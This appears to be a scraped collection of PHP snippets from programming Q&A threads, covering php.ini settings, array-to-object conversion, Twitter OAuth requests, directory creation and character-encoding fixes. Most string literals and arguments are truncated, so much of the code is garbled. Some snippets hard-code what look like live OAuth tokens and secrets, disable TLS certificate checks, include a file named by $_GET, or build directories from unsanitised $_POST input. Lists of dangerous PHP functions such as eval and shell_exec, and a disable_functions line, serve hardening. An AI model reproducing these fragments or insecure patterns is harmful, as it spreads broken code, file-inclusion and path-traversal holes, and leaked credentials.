Configuration File (php.ini) Path: /etc Loaded Configuration File: /etc/php.ini Scan for additional .ini files in: /etc/php.d Additional .ini files parsed: /etc/php.d/curl.ini, /etc/php.d/fileinfo.ini, /etc/php.d/gd.ini, /etc/php.d/json.ini, /etc/php.d/mcrypt.ini, /etc/php.d/mysql.ini, /etc/php.d/mysqli.ini, /etc/php.d/pdo.ini, /etc/php.d/pdo_mysql.ini, /etc/php.d/pdo_sqlite.ini, /etc/php.d/phar.ini, /etc/php.d/sqlite3.ini, /etc/php.d/zip.ini
sed -i "s/short_open_tag = .*/short_open_tag = On/" /etc/php5/apache2/php.ini
ERROR: [/etc/php.ini:159] unknown entry ERROR: Unable to include /etc/php.ini from /etc/php-fpm.conf at line 159 ERROR: failed to load configuration file ERROR: FPM initialization failed
; Default Value: On ; Development Value: Off ; Production Value: Off ; http: ;short_open_tag=Off <--Comment this out ; XAMPP for Linux is currently old fashioned short_open_tag = On <--Uncomment this
sed -i "s/short_open_tag = .*/short_open_tag = On/" /etc/php/7.2/apache2/php.ini
$GET = array(); $key = $rule = explode( /* array_push($GET, $rule[0] => $rule[1]); */
array_push($array, $value); $array[] = $value; $array[$key] = $value;
<?php $arr1 = array( $arr2 = array( $arr3 = $arr1 + $arr2; print_r($arr3);
$result_product = $array_product = array(); $i = 0; foreach ($result_product as $row_product) { $array_product [$i]["id"]= $row_product->id; $array_product [$i]["name"]= $row_product->name; $i++; } $json_product = json_encode($array_product); echo($json_product);
Class Form { private $Input = []; public function addTextField($class,$id){ $this->Input [ $this->Input [ $this->Input [ } } $form = new Form(); $form->addTextField( $form->addTextField( $form->addTextField(
array (size=3) array (size=3) 0 => string 1 => string 2 => string array (size=3) 0 => string 1 => string 2 => string array (size=3) 0 => string 1 => string 2 => string
$array1 = array("Post Slider", "Post Slider Wide", "Post Slider"); $array2 = array("Tools Sliders", "Tools Sliders", "modules-test"); $array3 = array(); $count = count($array1); for($x = 0; $x < $count; $x++){ $array3[$array1[$x].$x] = $array2[$x]; } foreach($array3 as $key => $value){ $output_key = substr($key, 0, -1); $output_value = $value; echo $output_key.": ".$output_value."<br>"; }
$main_array = array(); $value = 10; array_push($main_array, array(
$arr = array("key1"=>"value1", "key2"=>"value"); print_r($arr);
<?php $fname=array("Peter","Ben","Joe"); $age=array("35","37","43"); $c=array_combine($fname,$age); print_r($c); ?>
$newAarray = [newIndexname => newIndexValue] ; $yourArray = $newAarray + $yourArray ;
$ch = curl_init(); curl_setopt($ch, CURLOPT_URL, "http: curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); curl_close($ch); if ($output) { $tweets = json_decode($output,true); foreach ($tweets as $tweet) { print_r($tweet); } }
"{"errors":[{"message":"Could not authenticate you","code":32}]}"
require_once( /** Set access tokens here - see: https: $settings = array( );
/** URL for REST request, see: https: $url = $requestMethod =
/** POST fields required by the URL above. See relevant docs as above **/ $postfields = array( );
/** Perform the request and echo the response **/ $twitter = new TwitterAPIExchange($settings); echo $twitter->buildOauth($url, $requestMethod) ->setPostfields($postfields) ->performRequest();
/** Note: Set the GET field BEFORE calling buildOauth(); **/ $url = $getfield = $requestMethod = $twitter = new TwitterAPIExchange($settings); echo $twitter->setGetfield($getfield) ->buildOauth($url, $requestMethod) ->performRequest();
$url = $getfield = $requestMethod = $twitter = new TwitterAPIExchange($settings); echo $twitter->setGetfield($getfield) ->buildOauth($url, $requestMethod) ->performRequest();
<?php function buildBaseString($baseURI, $method, $params) { $r = array(); ksort($params); foreach($params as $key=>$value){ $r[] = "$key=" . rawurlencode($value); } return $method."&" . rawurlencode($baseURI) . } function buildAuthorizationHeader($oauth) { $r = $values = array(); foreach($oauth as $key=>$value) $values[] = "$key=\"" . rawurlencode($value) . "\""; $r .= implode( return $r; } $url = "https: $oauth_access_token = "YOURVALUE"; $oauth_access_token_secret = "YOURVALUE"; $consumer_key = "YOURVALUE"; $consumer_secret = "YOURVALUE"; $oauth = array( $base_info = buildBaseString($url, $composite_key = rawurlencode($consumer_secret) . $oauth_signature = base64_encode(hash_hmac( $oauth[ $header = array(buildAuthorizationHeader($oauth), $options = array( CURLOPT_HTTPHEADER => $header, CURLOPT_HEADER => false, CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true, CURLOPT_SSL_VERIFYPEER => false); $feed = curl_init(); curl_setopt_array($feed, $options); $json = curl_exec($feed); curl_close($feed); $twitter_data = json_decode($json); print_r ($twitter_data); ?>
$oauth = array( ); $options = array( CURLOPT_HTTPHEADER => $header, CURLOPT_HEADER => false, CURLOPT_URL => $url . CURLOPT_RETURNTRANSFER => true, CURLOPT_SSL_VERIFYPEER => false );
function buildBaseString($baseURI, $method, $params) { $r = array(); ksort($params); foreach($params as $key=>$value){ $r[] = "$key=" . rawurlencode($value); } return $method."&" . rawurlencode($baseURI) . } function buildAuthorizationHeader($oauth) { $r = $values = array(); foreach($oauth as $key=>$value) $values[] = "$key=\"" . rawurlencode($value) . "\""; $r .= implode( return $r; } function returnTweet(){ $oauth_access_token = "x"; $oauth_access_token_secret = "x"; $consumer_key = "x"; $consumer_secret = "x"; $twitter_timeline = "user_timeline"; $request = array( ); $oauth = array( ); $oauth = array_merge($oauth, $request); $base_info = buildBaseString("https: $composite_key = rawurlencode($consumer_secret) . $oauth_signature = base64_encode(hash_hmac( $oauth[ $header = array(buildAuthorizationHeader($oauth), $options = array( CURLOPT_HTTPHEADER => $header, CURLOPT_HEADER => false, CURLOPT_URL => "https: CURLOPT_RETURNTRANSFER => true, CURLOPT_SSL_VERIFYPEER => false); $feed = curl_init(); curl_setopt_array($feed, $options); $json = curl_exec($feed); curl_close($feed); return json_decode($json, true); }
$token = $token_secret = $consumer_key = $consumer_secret = $host = $method = $path = $query = array( ); $oauth = array( ); $oauth = array_map("rawurlencode", $oauth); $query = array_map("rawurlencode", $query); $arr = array_merge($oauth, $query); asort($arr); ksort($arr); $querystring = urldecode(http_build_query($arr, $url = "https: $base_string = $method."&".rawurlencode($url)."&".rawurlencode($querystring); $key = rawurlencode($consumer_secret)."&".rawurlencode($token_secret); $signature = rawurlencode(base64_encode(hash_hmac( $url .= "?".http_build_query($query); $url=str_replace("&amp;","&",$url); $oauth[ ksort($oauth); function add_quotes($str) { return $oauth = array_map("add_quotes", $oauth); $auth = "OAuth " . urldecode(http_build_query($oauth, $options = array( CURLOPT_HTTPHEADER => array("Authorization: $auth"), CURLOPT_HEADER => false, CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true, CURLOPT_SSL_VERIFYPEER => false); $feed = curl_init(); curl_setopt_array($feed, $options); $json = curl_exec($feed); curl_close($feed); $twitter_data = json_decode($json);
$token = $token_secret = $consumer_key = $consumer_secret = $host = $method = $path = $query = array( ); $oauth = array( ); $oauth = array_map("rawurlencode", $oauth); $query = array_map("rawurlencode", $query); $arr = array_merge($oauth, $query); asort($arr); ksort($arr); $querystring = urldecode(http_build_query($arr, $url = "https: $base_string = $method."&".rawurlencode($url)."&".rawurlencode($querystring); $key = rawurlencode($consumer_secret)."&".rawurlencode($token_secret); $signature = rawurlencode(base64_encode(hash_hmac( $url .= "?".http_build_query($query); $oauth[ ksort($oauth); function add_quotes($str) { return $oauth = array_map("add_quotes", $oauth); $auth = "OAuth " . urldecode(http_build_query($oauth, $options = array( CURLOPT_HTTPHEADER => array("Authorization: $auth"), CURLOPT_HEADER => false, CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true, CURLOPT_SSL_VERIFYPEER => false); $feed = curl_init(); curl_setopt_array($feed, $options); $json = curl_exec($feed); curl_close($feed); $twitter_data = json_decode($json);
$oauth = new OAuth($consumer_key, $consumer_secret, OAUTH_SIG_METHOD_HMACSHA1, OAUTH_AUTH_TYPE_URI); $oauth->setToken($access_token, $access_secret); $oauth->fetch("https: $twitter_data = json_decode($oauth->getLastResponse()); print_r($twitter_data);
$url = $count = $oauth = array( $oauth[ $twitterData = json_decode(file_get_contents($url . . implode(
$connection = new TwitterOAuth(CONSUMER_KEY, CONSUMER_SECRET, OAUTH_TOKEN, OAUTH_TOKEN_SECRET); $timelines = $connection->get(
<?php function buildBaseString($baseURI, $method, $params) { $r = array(); ksort($params); foreach($params as $key=>$value){ $r[] = "$key=" . rawurlencode($value); } return $method."&" . rawurlencode($baseURI) . } function buildAuthorizationHeader($oauth) { $r = $values = array(); foreach($oauth as $key=>$value) $values[] = "$key=\"" . rawurlencode($value) . "\""; $r .= implode( return $r; } function returnTweet(){ $oauth_access_token = "2602299919-lP6mgkqAMVwvHM1L0Cplw8idxJzvuZoQRzyMkOx"; $oauth_access_token_secret = "wGWny2kz67hGdnLe3Uuy63YZs4nIGs8wQtCU7KnOT5brS"; $consumer_key = "zAzJRrPOj5BvOsK5QhscKogVQ"; $consumer_secret = "Uag0ujVJomqPbfdoR2UAWbRYhjzgoU9jeo7qfZHCxR6a6ozcu1"; $twitter_timeline = "user_timeline"; $request = array( ); $oauth = array( ); $oauth = array_merge($oauth, $request); $base_info = buildBaseString("https: $composite_key = rawurlencode($consumer_secret) . $oauth_signature = base64_encode(hash_hmac( $oauth[ $header = array(buildAuthorizationHeader($oauth), $options = array( CURLOPT_HTTPHEADER => $header, CURLOPT_HEADER => false, CURLOPT_URL => "https: CURLOPT_RETURNTRANSFER => true, CURLOPT_SSL_VERIFYPEER => false); $feed = curl_init(); curl_setopt_array($feed, $options); $json = curl_exec($feed); curl_close($feed); return $json; } $tweet = returnTweet(); echo $tweet; ?>
CREATE TABLE IF NOT EXISTS `tweets` ( `tweet_id` int(11) NOT NULL auto_increment, `id_tweet` bigint(20) NOT NULL, `text_tweet` char(144) NOT NULL, `datetime_tweet` datetime NOT NULL, `dayofweek_tweet` char(3) NOT NULL, `GMT_tweet` char(5) NOT NULL, `shorturl_tweet` char(23) NOT NULL, PRIMARY KEY (`tweet_id`) ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=83 ;
<?php function buildBaseString($baseURI, $method, $params) { $r= array(); ksort($params); foreach($params as $key=>$value){ $r[]= "$key=".rawurlencode($value); } return $method."&".rawurlencode($baseURI). } function buildAuthorizationHeader($oauth) { $r= $values= array(); foreach($oauth as $key=>$value) { $values[]= "$key=\"".rawurlencode($value)."\""; } $r.= implode( return $r; } function returnTweets($last_id) { $oauth_access_token = "2687912757-vbyfJA483SEyj2HJ2K346aVMxtOIgVbsY4Edrsw"; $oauth_access_token_secret = "nIruzmR0bXqC3has4fTf8KAq4pgOceiuKqjklhroENU4W"; $api_key = "ieDSTFH8QHHPafg7H0whQB9GaY"; $api_secret = "mgm8wVS9YP93IJmTQtsmR8ZJADDNdlTca5kCizMkC7O7gFDS1j"; $twitter_timeline = "user_timeline"; $request= array( ); if (!is_null($last_id)) { $request[ } $oauth = array( ); $oauth= array_merge($oauth, $request); $base_info= buildBaseString("https: $composite_key= rawurlencode($api_secret). $oauth_signature= base64_encode(hash_hmac( $oauth[ $header= array(buildAuthorizationHeader($oauth), $options= array(CURLOPT_HTTPHEADER => $header, CURLOPT_HEADER => false, CURLOPT_URL => "https: CURLOPT_RETURNTRANSFER => true, CURLOPT_SSL_VERIFYPEER => false); $feed= curl_init(); curl_setopt_array($feed, $options); $json= curl_exec($feed); curl_close($feed); return $json; } function parse_tweettext($tweet_text) { $text= substr($tweet_text, 0, -23); $short_url= substr($tweet_text, -23, 23); return array ( } function parse_tweetdatetime($tweetdatetime) { $months= array( $GMT= substr($tweetdatetime, -10, 5); $year= substr($tweetdatetime, -4, 4); $month_str= substr($tweetdatetime, 4, 3); $month= $months[$month_str]; $day= substr($tweetdatetime, 8, 2); $dayofweek= substr($tweetdatetime, 0, 3); $time= substr($tweetdatetime, 11, 8); $date= $year. $datetime= $date. return array( } $query= "SELECT MAX(tweets.id_tweet) AS id_last FROM tweets;"; $result= exec_query($query); $row= mysql_fetch_object($result); if ($result!= 0 && mysql_num_rows($result)) { $last_id= $row->id_last; } else { $last_id= null; } $json= returnTweets($last_id); $tweets= json_decode($json, TRUE); foreach ($tweets as $tweet) { $tweet_id= $tweet[ if (!empty($tweet_id)) { $tweet_parsetext= parse_tweettext($tweet[ $tweet_text= utf8_encode($tweet_parsetext[ $tweet_shorturl= $tweet_parsetext[ $tweet_parsedt= parse_tweetdatetime($tweet[ $tweet_datetime= $tweet_parsedt[ $tweet_dayofweek= $tweet_parsedt[ $tweet_GMT= $tweet_parsedt[ $fields = array( ); $new_id= mysql_insert( } } ?>
function mysql_insert($table, $inserts) { $keys = array_keys($inserts); exec_query("START TRANSACTION;"); $query= exec_query($query); $id= mysql_insert_id(); if (mysql_error()) { exec_query("ROLLBACK;"); die("Error: $query"); } else { exec_query("COMMIT;"); } return $id; }
$object = new stdClass(); foreach ($array as $key => $value) { $object->$key = $value; }
$object = (object) $array_name; echo $object->username;
class convert { public $varible; public function __construct($array) { $this = $array; } public static function toObject($array) { $array = new convert($array); return $array; } }
$object = object; foreach ($arr as $key => $value) { $object->{$key} = $value; }
$object = json_decode(json_encode((object) $yourArray), FALSE);
/** * dereference a value and optionally setting its type * * @param mixed $mixed * @param null $type (optional) * * @return mixed $mixed set as $type */ function rettype($mixed, $type = NULL) { $type === NULL || settype($mixed, $type); return $mixed; }
$obj= new stdClass(); foreach ($array as $k=> $v) { $obj->{$k} = $v; }
function array_to_obj($array, &$obj) { foreach ($array as $key => $value) { if (is_array($value)) { $obj->$key = new stdClass(); array_to_obj($value, $obj->$key); } else { $obj->$key = $value; } } return $obj; } function arrayToObject($array) { $object= new stdClass(); return array_to_obj($array,$object); }
$myobject = arrayToObject($array); print_r($myobject);
[127] => stdClass Object ( [status] => Have you ever created a really great looking website design ) [128] => stdClass Object ( [status] => Figure A. Facebook ) [129] => stdClass Object ( [status] => The other day at work, I had some spare time )
static public function array_to_object(array $array) { foreach($array as $key => $value) { if(is_array($value)) { $array[$key] = self::array_to_object($value); } } return (object)$array; }
<?php class Person { private $name; private $age; private $sexe; function __construct ($payload) { if (is_array($payload)) $this->from_array($payload); } public function from_array($array) { foreach(get_object_vars($this) as $attrName => $attrValue) $this->{$attrName} = $array[$attrName]; } public function say_hi () { print "hi my name is {$this->name}"; } } print_r($_POST); $mike = new Person($_POST); $mike->say_hi(); ?>
function __toObject(Array $arr) { $obj = new stdClass(); foreach($arr as $key=>$val) { if (is_array($val)) { $val = __toObject($val); } $obj->$key = $val; } return $obj; }
const MAX_LEVEL = 5; public function arrayToObject($a, $level=0) { if(!is_array($a)) { throw new InvalidArgumentException(sprintf( } if($level > self::MAX_LEVEL) { throw new OverflowException(sprintf( } $o = new stdClass(); foreach($a as $key => $value) { if(is_array($value)) { $value = $this->arrayToObject($value, $level+1); } $o->{$key} = $value; } return $o; }
$array = array( ), ); $object = json_decode(json_encode($array));
<?php $arr = array("test", array("one"=>1,"two"=>2,"three"=>3), array("one"=>1,"two"=>2,"three"=>3) ); $o = new ArrayObject($arr); echo $o->offsetGet(2)["two"],"\n"; foreach ($o as $key=>$val){ if (is_array($val)) { foreach($val as $k => $v) { echo $k . } } else { echo $val,"\n"; } } ?> 2 test one => 1 two => 2 three => 3 one => 1 two => 2 three => 3
class Person { private $name; private $dob; private $age; private $company; private $city; }
class PersonIterator extends \FilterIterator { public function accept() { return property_exists( } }
public function getObject(Person $object) { foreach ($this as $key => $value) { $object->{ } return $object; }
$arrayiterator = new \ArrayIterator($a); $personIterator = new \PersonIterator($arrayiterator); $personIterator->getObject();
function buildObject($class,$data){ $object = new $class; foreach($data as $key=>$value){ if(property_exists($class,$key)){ $object->{ } } return $object; }
<?php $a = Array ( var_dump($a); $b = (object)$a; var_dump($b); var_dump($b->status);
/** * Returns true if the array has only integer keys */ function isArrayAssociative(array $array) { return (bool)count(array_filter(array_keys($array), } /** * Converts an array to an object, but leaves non-associative arrays as arrays. * This is the same logic that `json_decode(json_encode($arr), false)` uses. */ function arrayToObject(array $array, $maxDepth = 10) { if($maxDepth == 0) { return $array; } if(isArrayAssociative($array)) { $newObject = new \stdClass; foreach ($array as $key => $value) { if(is_array($value)) { $newObject->{$key} = arrayToObject($value, $maxDepth - 1); } else { $newObject->{$key} = $value; } } return $newObject; } else { $newArray = array(); foreach ($array as $value) { if(is_array($value)) { $newArray[] = arrayToObject($value, $maxDepth - 1); } else { $newArray[] = $value; } } return $newArray; } }
function arrayToObject($conArray) { if(is_array($conArray)){ /* * Return array converted to object * Using __FUNCTION__ (Magic constant) * for recursive call */ return (object) array_map(__FUNCTION__, $conArray); }else{ return $conArray; } }
$object= json_decode(json_encode($result_array, JSON_FORCE_OBJECT));
function convertArray2Object($defs) { $innerfunc = function ($a) use ( &$innerfunc ) { return (is_array($a)) ? (object) array_map($innerfunc, $a) : $a; }; return (object) array_map($innerfunc, $defs); }
function convert_array_to_object($array){ $obj= new stdClass(); foreach ($array as $k=> $v) { if (is_array($v)){ $v = convert_array_to_object($v); } $obj->{strtolower($k)} = $v; } return $obj; }
class Util { static function arrayToObject($array, $class = if (!is_array($array)) { return $array; } $object = unserialize( sprintf( ) ); if (is_array($array) && count($array) > 0) { foreach ($array as $name => $value) { $name = strtolower(trim($name)); if (!empty($name)) { if(method_exists($object, $object->{ }else{ if(($strict)){ if(property_exists($class, $name)){ $object->$name = Util::arrayToObject($value); } }else{ $object->$name = Util::arrayToObject($value); } } } } return $object; } else { return FALSE; } } }
function arrayToObject(array $arr) { $flat = array_keys($arr) === range(0, count($arr) - 1); $out = $flat ? [] : new \stdClass(); foreach ($arr as $key => $value) { $temp = is_array($value) ? $this->arrayToObject($value) : $value; if ($flat) { $out[] = $temp; } else { $out->{$key} = $temp; } } return $out; }
$arr = ["a", "b", "c"]; var_export(json_decode(json_encode($arr))); var_export($this->arrayToObject($arr));
$arr = [["a" => 1], ["a" => 1], ["a" => 1]]; var_export(json_decode(json_encode($arr))); var_export($this->arrayToObject($arr));
array( 0 => stdClass::__set_state(array( 1 => stdClass::__set_state(array( 2 => stdClass::__set_state(array( ) array( 0 => stdClass::__set_state(array( 1 => stdClass::__set_state(array( 2 => stdClass::__set_state(array( )
$arr = ["a" => 1]; var_export(json_decode($arr)); var_export($this->arrayToObject($arr));
stdClass::__set_state(array( stdClass::__set_state(array(
$list_years = array(); $object = new stdClass(); $object->year_id = 1 ; $object->year_name = 2001 ; $list_years[] = $object;
function object_to_array($data) { if (is_array($data) || is_object($data)) { $result = array(); foreach ($data as $key => $value) { $result[$key] = object_to_array($value); } return $result; } return $data; } function array_to_object($data) { if (is_array($data) || is_object($data)) { $result= new stdClass(); foreach ($data as $key => $value) { $result->$key = array_to_object($value); } return $result; } return $data; }
<?php $a = array( $obj = new stdClass(); $obj->a = $obj->b = $obj->c = $obj->d = print_r($a);echo print_r($obj);echo $b = (array) $obj; print_r($b);echo $c = (object) $a; print_r($c);echo ?>
/** * Makes a config object from an array, making the first level keys properties a new object. * Property values are converted to camelCase and are not set if one already exists. * @param array $configArray Config array. * @param boolean $strict To return an empty object if $configArray is not an array * @return stdObject The config object */ public function makeConfigFromArray($configArray = [],$strict = true) { $object = new stdClass(); if (!is_array($configArray)) { if(!$strict && !is_null($configArray)) { return $configArray; } return $object; } foreach ($configArray as $name => $value) { $_name = camel_case($name); if(is_array($value)) { $makeobject = true; foreach($value as $key => $val) { if(is_numeric(substr($key,0,1))) { $makeobject = false; } if(is_array($val)) { $value[$key] = $this->makeConfigFromArray($val,false); } } if($makeobject) { $object->{$name} = $object->{$_name} = $this->makeConfigFromArray($value,false); } else { $object->{$name} = $object->{$_name} = $value; } } else { $object->{$name} = $object->{$_name} = $value; } } return $object; }
fields: abc: type: formfield something: - a - b - c - d: foo: bar
array:1 [ "fields" => array:1 [ "abc" => array:2 [ "type" => "formfield" "something" => array:4 [ 0 => "a" 1 => "b" 2 => "c" 3 => array:1 [ "d" => array:1 [ "foo" => "bar" ] ] ] ] ] ]
{ +"fields": { +"abc": { +"type": "formfield" +"something": array:4 [ 0 => "a" 1 => "b" 2 => "c" 3 => { +"d": { +"foo": "bar" } } ] } } }
$galleryIds = [1, $ids = array_filter($galleryIds, function($n){return (is_numeric($n));}); $ids = implode( $sql = "SELECT * FROM galleries WHERE id IN ({$ids})"; $statement = $pdo->prepare($sql); $statement->execute();
$ids = array_filter(array_unique(array_map( if ($ids) { $query = }
www.mysite.com/category/subcategory?q=myquery <?php echo $_GET[ ?>
function refererQueryString( ) { if (!isset($_SERVER[ empty( $_SERVER[ empty(parse_url($_SERVER[ return } $refererQueryString = parse_url(urldecode($_SERVER[ $args = func_get_args(); $pairs = explode( $return = foreach ($pairs as $pair) { $keyVal = explode( $key = &$keyVal[0]; $val = urlencode($keyVal[1]); if(in_array($key,$args)) { $return .= } } return ltrim($return, } header(
function get_query_string(){ $arr = explode("?",$_SERVER[ if (count($arr) == 2){ return ""; }else{ return "?".end($arr)."<br>"; } } $query_string = get_query_string();
function getv($key, $default = { $param = (isset($_REQUEST[$key]) ? $_REQUEST[$key] : $default); if (!is_array($param) && $data_type == $param = intval($param); } return $param; }
<?php parse_str( $foo = array( ?> Instead, PHP uses a non-standards compliant practice of including brackets in fieldnames to achieve the same effect. <?php parse_str( $foo = array( ?> This can be confusing for anyone who <?php function proper_parse_str($str) { $arr = array(); $pairs = explode( foreach ($pairs as $i) { list($name,$value) = explode( if( isset($arr[$name]) ) { if( is_array($arr[$name]) ) { $arr[$name][] = $value; } else { $arr[$name] = array($arr[$name], $value); } } else { $arr[$name] = $value; } } return $arr; } $query = proper_parse_str($_SERVER[ ?>
eval() assert() - identical to eval() preg_replace( create_function() include() include_once() require() require_once() $_GET[ $func = new ReflectionFunction($_GET[
phpinfo posix_mkfifo posix_getlogin posix_ttyname getenv get_current_user proc_get_status get_cfg_var disk_free_space disk_total_space diskfreespace getcwd getlastmo getmygid getmyinode getmypid getmyuid
extract - Opens the door for register_globals attacks (see study in scarlet). parse_str - works like extract if only one argument is given. putenv ini_set mail - has CRLF injection in the 3rd parameter, opens the door for spam. header - on old systems CRLF injection could be used for xss or other purposes, now it is still a problem if they do a header("location: ..."); and they do not die();. The script keeps executing after a call to header(), and will still print output normally. This is nasty if you are trying to protect an administrative area. proc_nice proc_terminate proc_close pfsockopen fsockopen apache_child_terminate posix_kill posix_mkfifo posix_setpgid posix_setsid posix_setuid
fopen tmpfile bzopen gzopen SplFileObject->__construct chgrp chmod chown copy file_put_contents lchgrp lchown link mkdir move_uploaded_file rename rmdir symlink tempnam touch unlink imagepng - 2nd parameter is a path. imagewbmp - 2nd parameter is a path. image2wbmp - 2nd parameter is a path. imagejpeg - 2nd parameter is a path. imagexbm - 2nd parameter is a path. imagegif - 2nd parameter is a path. imagegd - 2nd parameter is a path. imagegd2 - 2nd parameter is a path. iptcembed ftp_get ftp_nb_get file_exists file_get_contents file fileatime filectime filegroup fileinode filemtime fileowner fileperms filesize filetype glob is_dir is_executable is_file is_link is_readable is_uploaded_file is_writable is_writeable linkinfo lstat parse_ini_file pathinfo readfile readlink realpath stat gzfile readgzfile getimagesize imagecreatefromgif imagecreatefromjpeg imagecreatefrompng imagecreatefromwbmp imagecreatefromxbm imagecreatefromxpm ftp_put ftp_nb_put exif_read_data read_exif_data exif_thumbnail exif_imagetype hash_file hash_hmac_file hash_update_file md5_file sha1_file highlight_file show_source php_strip_whitespace get_meta_tags
root@vps [~] disable_functions = dl, exec, shell_exec, system, passthru, popen, pclose, proc_open, proc_nice, proc_terminate, proc_get_status, proc_close, pfsockopen, leak, apache_child_terminate, posix_kill, posix_mkfifo, posix_setpgid, posix_setsid, posix_setuid
$include = $_GET[ if ( preg_match("/\\.php$/",$include) ) include($include);
<?php declare(ticks = 1); set_time_limit(1); function foo() { for (;;) {} } class Invoker_TimeoutException extends RuntimeException {} class Invoker { public function invoke($callable, $timeout) { pcntl_signal(SIGALRM, function() { throw new Invoker_TimeoutException; }, TRUE); pcntl_alarm($timeout); call_user_func($callable); } } try { $invoker = new Invoker; $invoker->invoke( } catch (Exception $e) { sleep(10); echo "Still running despite of the timelimit"; }
if (!file_exists($dir) && !is_dir($dir)) { mkdir($dir); }
$dirname = $_POST["search"]; $filename = "/folder/" . $dirname . "/"; if (!file_exists($filename)) { mkdir("folder/" . $dirname, 0777); echo "The directory $dirname was successfully created."; exit; } else { echo "The directory $dirname exists."; }
<?php /** * Checks if a folder exist and return canonicalized absolute pathname (long version) * @param string $folder the path being checked. * @return mixed returns the canonicalized absolute pathname on success otherwise FALSE is returned */ function folder_exist($folder) { $path = realpath($folder); if($path !== false AND is_dir($path)) { return $path; } return false; }
<?php /** * Checks if a folder exist and return canonicalized absolute pathname (sort version) * @param string $folder the path being checked. * @return mixed returns the canonicalized absolute pathname on success otherwise FALSE is returned */ function folder_exist($folder) { $path = realpath($folder); return ($path !== false AND is_dir($path)) ? $path : false; }
<?php /** CASE 1 **/ $input = var_dump($input); $output = folder_exist($input); var_dump($output); /** CASE 2 **/ $input = var_dump($input); $output = folder_exist($input); var_dump($output); /** CASE 3 **/ $input = var_dump($input); $output = folder_exist($input); var_dump($output);
<?php $folder = if(FALSE !== ($path = folder_exist($folder))) { die( } mkdir($folder);
if (file_exists( if (!is_dir( unlink( mkdir( } } else { mkdir( }
$year = date("Y"); $month = date("m"); $filename = "../".$year; $filename2 = "../".$year."/".$month; if(file_exists($filename)){ if(file_exists($filename2)==false){ mkdir($filename2,0777); } }else{ mkdir($filename,0777); }
$save_folder = "some/path/" . date( if (!file_exists($save_folder)) { mkdir($save_folder, 0777); }
namespace com\stackoverflow; set_error_handler(function($errno, $errm) { if (strpos($errm,"exists") === false) throw new \Exception($errm); }); mkdir($folder); restore_error_handler();
<?php $dirname = "small"; $filename = "upload/".$dirname."/"; if (!is_dir($filename )) { mkdir("upload/" . $dirname, 0777, true); echo "The directory $dirname was successfully created."; exit; } else { echo "The directory $dirname exists."; } ?>
<VirtualHost *:80> DocumentRoot C:\Projects\transitCalculator\trunk ServerName transitcalculator.localhost <Directory C:\Projects\transitCalculator\trunk> Order allow,deny Allow from all </Directory> </VirtualHost>
Alias /transitCalculator "C:/Projects/transitCalculator/trunk"
NameVirtualHost *:80 <VirtualHost *:80> DocumentRoot C:\projects\transitCalculator\trunk\ ServerName transitcalculator.localhost <Directory C:\projects\transitCalculator\trunk\> Order allow,deny Allow from all </Directory> </VirtualHost>
<Directory /> Options FollowSymLinks AllowOverride All Allow from all </Directory>
function correct_encoding($text) { $current_encoding = mb_detect_encoding($text, $text = iconv($current_encoding, return $text; }
require_once( use \ForceUTF8\Encoding; $utf8_string = Encoding::toUTF8($utf8_or_latin1_or_mixed_string); $latin1_string = Encoding::toLatin1($utf8_or_latin1_or_mixed_string);
require_once( use \ForceUTF8\Encoding; $utf8_string = Encoding::fixUTF8($garbled_utf8_string);
echo Encoding::fixUTF8("FÃ©dÃ©ration Camerounaise de Football"); echo Encoding::fixUTF8("FÃÂ©dÃÂ©ration Camerounaise de Football"); echo Encoding::fixUTF8("FÃÂÃÂ©dÃÂÃÂ©ration Camerounaise de Football"); echo Encoding::fixUTF8("FÃÂ©dération Camerounaise de Football");
Fédération Camerounaise de Football Fédération Camerounaise de Football Fédération Camerounaise de Football Fédération Camerounaise de Football
$url = $accept = array( ); $header = array( ); $encoding = null; $curl = curl_init($url); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); curl_setopt($curl, CURLOPT_HEADER, true); curl_setopt($curl, CURLOPT_HTTPHEADER, $header); $response = curl_exec($curl); if (!$response) { } else { $offset = strpos($response, "\r\n\r\n"); $header = substr($response, 0, $offset); if (!$header || !preg_match( } else { if (!in_array(strtolower($match[1]), array_map( } $encoding = trim($match[2], } if (!$encoding) { $body = substr($response, $offset + 4); if (preg_match( $encoding = trim($match[1], } } if (!$encoding) { $encoding = } else { if (!in_array($encoding, array_map( } if ($encoding != $body = mb_convert_encoding($body, } } $simpleXML = simplexml_load_string($body, null, LIBXML_NOERROR); if (!$simpleXML) { } else { echo $simpleXML->asXML(); } }
function isUTF8($string) { return (utf8_encode(utf8_decode($string)) == $string); }
function detectUTF8($string) { return preg_match( [\xC2-\xDF][\x80-\xBF] |\xE0[\xA0-\xBF][\x80-\xBF] |[\xE1-\xEC\xEE\xEF][\x80-\xBF]{2} |\xED[\x80-\x9F][\x80-\xBF] |\xF0[\x90-\xBF][\x80-\xBF]{2} |[\xF1-\xF3][\x80-\xBF]{3} |\xF4[\x80-\x8F][\x80-\xBF]{2} )+%xs $string); }
$inputstring = getFromUser(); $utf8string = iconv($current_encoding, $flawedstring = iconv($current_encoding,
function fixRequestCharset() { $ref = array( &$_GET, &$_POST, &$_REQUEST ); foreach ( $ref as &$var ) { foreach ( $var as $key => $val ) { $encoding = mb_detect_encoding( $var[ $key ], mb_detect_order(), true ); if ( !$encoding ) continue; if ( strcasecmp( $encoding, { $encoding = iconv( $encoding, if ( $encoding === false ) continue; $var[ $key ] = $encoding; } } } }
mb_detect_encoding($input, "UTF-8", "ISO-8859-9, UTF-8"); mb_detect_encoding($input, "UTF-8", "UTF-8, ISO-8859-9");
try { $process = array(&$_GET, &$_POST, &$_REQUEST); while (list($key, $val) = each($process)) { foreach ($val as $k => $v) { unset($process[$key][$k]); if (is_array($v)) { $process[$key][@mb_convert_encoding($k, $process[] = &$process[$key][@mb_convert_encoding($k, } else { $process[$key][@mb_convert_encoding($k, } } } unset($process); } catch(Exception $ex){}
$finallyIDidIt = mb_convert_encoding( $string, mysql_client_encoding($resourceID), mb_detect_encoding($string) );
echo mb_detect_encoding($str, "UTF-8, ASCII, ISO-8859-1");
<?php function convertToUTF8($str) { $enc = mb_detect_encoding($str); if ($enc && $enc != return iconv($enc, } else { return $str; } } ?>
if (isUTF8($str)) { echo $str; } else { echo iconv("ISO-8859-1", "UTF-8 }
